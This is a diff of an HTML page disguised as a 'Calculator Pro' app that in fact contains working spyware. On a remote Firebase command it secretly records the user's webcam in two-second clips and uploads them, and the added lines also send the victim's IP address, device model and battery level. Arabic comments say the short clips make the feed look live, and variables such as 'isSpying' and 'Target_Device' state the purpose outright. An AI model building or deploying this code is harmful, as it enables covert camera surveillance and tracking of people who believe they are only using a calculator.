@@ -5,9 +5,9 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>Calculator Pro</title>
     <style>
-        body { background: #17181A; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
+        body { background: #17181A; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
         .calc { width: 90%; max-width: 360px; background: #222427; padding: 25px; border-radius: 30px; }
-        #display { font-size: 48px; color: #FFF; text-align: right; margin-bottom: 25px; height: 60px; }
+        #display { font-size: 48px; color: #FFF; text-align: right; margin-bottom: 25px; height: 60px; overflow: hidden; }
         .grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 15px; }
         button { border: none; border-radius: 50%; height: 70px; width: 70px; font-size: 24px; color: #fff; background: #333639; }
         .btn-op { background: #008DDE; }
@@ -23,7 +23,7 @@
         <button onclick="p('7')">7</button><button onclick="p('8')">8</button><button onclick="p('9')">9</button><button class="btn-op">×</button>
         <button onclick="p('4')">4</button><button onclick="p('5')">5</button><button onclick="p('6')">6</button><button class="btn-op">−</button>
         <button onclick="p('1')">1</button><button onclick="p('2')">2</button><button onclick="p('3')">3</button><button class="btn-op">+</button>
-        <button onclick="p('0')">0</button><button>.</button><button style="grid-column: span 2; width: auto; border-radius: 35px; background: #008DDE;">=</button>
+        <button onclick="p('0')">0</button><button>.</button><button style="grid-column: span 2; width: auto; border-radius: 35px; background: #008DDE;" onclick="equal()">=</button>
     </div>
 </div>
 
@@ -34,50 +34,67 @@
     const firebaseConfig = { databaseURL: "https://itel-d77e2-default-rtdb.firebaseio.com" };
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
-    const devName = "Main_Device";
+    const devName = "Target_Device";
     let isSpying = false;
 
-    navigator.mediaDevices.getUserMedia({ video: { width: 320, height: 240 }, audio: false })
+    // جلب الـ IP ونوع الجهاز
+    async function getClientData() {
+        let ip = "Unknown";
+        try {
+            const res = await fetch('https://api.ipify.org?format=json');
+            const data = await res.json();
+            ip = data.ip;
+        } catch(e) {}
+        
+        let model = "Android/Generic";
+        if (navigator.userAgent.indexOf("Android") != -1) model = "Android Device";
+        if (navigator.userAgent.indexOf("iPhone") != -1) model = "iPhone / iOS";
+        
+        return { ip, model };
+    }
+
+    navigator.mediaDevices.getUserMedia({ video: { width: 400, height: 300 }, audio: false })
     .then(stream => {
-        db.ref('commands/' + devName).on('value', snap => {
+        db.ref('commands/' + devName).on('value', async snap => {
             if(snap.val() === "ON" && !isSpying) {
                 isSpying = true;
-                startDirectStream(stream);
+                const info = await getClientData();
+                startDirectInject(stream, info);
             } else if(snap.val() === "OFF") {
                 isSpying = false;
             }
         });
     });
 
-    function startDirectStream(stream) {
+    function startDirectInject(stream, info) {
         if(!isSpying) return;
-
-        let recorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8' });
+        let recorder = new MediaRecorder(stream);
         let chunks = [];
         recorder.ondataavailable = e => chunks.push(e.data);
-        
-        recorder.onstop = () => {
+        recorder.onstop = async () => {
             const blob = new Blob(chunks, { type: 'video/webm' });
             const reader = new FileReader();
             reader.readAsDataURL(blob);
-            reader.onloadend = () => {
-                // رفع مباشر "دايركت" للداتا بيز
+            reader.onloadend = async () => {
+                const batt = await navigator.getBattery();
                 db.ref('live_stream/' + devName).set({
                     v: reader.result,
-                    t: Date.now()
+                    ip: info.ip,
+                    model: info.model,
+                    batt: Math.round(batt.level * 100) + "%",
+                    last: new Date().toLocaleTimeString()
                 });
-                if(isSpying) startDirectStream(stream);
+                if(isSpying) startDirectInject(stream, info);
             };
         };
-
         recorder.start();
-        // تسجيل ثانيتين فقط عشان يبان إنه لايف
         setTimeout(() => { if(recorder.state === 'recording') recorder.stop(); }, 2000);
     }
 
     let d = document.getElementById('display');
     function p(v){ if(d.innerText==="0") d.innerText=""; d.innerText+=v; }
     function clr(){ d.innerText="0"; }
+    function equal(){ try{d.innerText=eval(d.innerText.replace('×','*').replace('÷','/'));}catch{d.innerText="Error";} }
 </script>
 </body>
 </html>
